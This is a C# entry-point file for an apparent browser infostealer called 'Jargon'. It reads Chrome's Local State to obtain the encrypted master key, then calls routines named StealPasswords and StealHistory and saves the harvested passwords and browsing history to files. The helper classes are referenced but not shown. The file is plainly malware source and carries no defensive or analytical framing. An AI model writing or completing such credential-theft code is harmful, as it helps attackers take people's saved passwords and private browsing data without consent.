using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Jargon
{
    class Program
    {
        public static Jarsql JargonSqlHandler = new Jarsql();
        public static string KEY = "";

        static void Main(string[] args)
        {
            Utilties.InitilaizeConsole();
            ConsoleAlert.PrintTitle();
            ConsoleAlert.Info("Starting Up...");

            string text = File.ReadAllText(Jardirs.GOOGLE_LOCAL_STATE);
            dynamic x = JsonConvert.DeserializeObject(text);
            KEY = x.os_crypt.encrypted_key;

     

            JarStealer.StealPasswords();
            ConsoleAlert.Info("All passwords will saved...");
            Utilties.PasswordsToFile();
            ConsoleAlert.Success("Saved.");

            
            ConsoleAlert.Info("Getting History");
            JarStealer.StealHistory();
            ConsoleAlert.Info("Started to get history...");
            ConsoleAlert.Warning("This will take time.");

            ConsoleAlert.Info("All histories will saved...");
            Utilties.HistoryToFile();
            ConsoleAlert.Success("Saved.");
            

            Console.ReadLine();
        }


    
    }

  
}
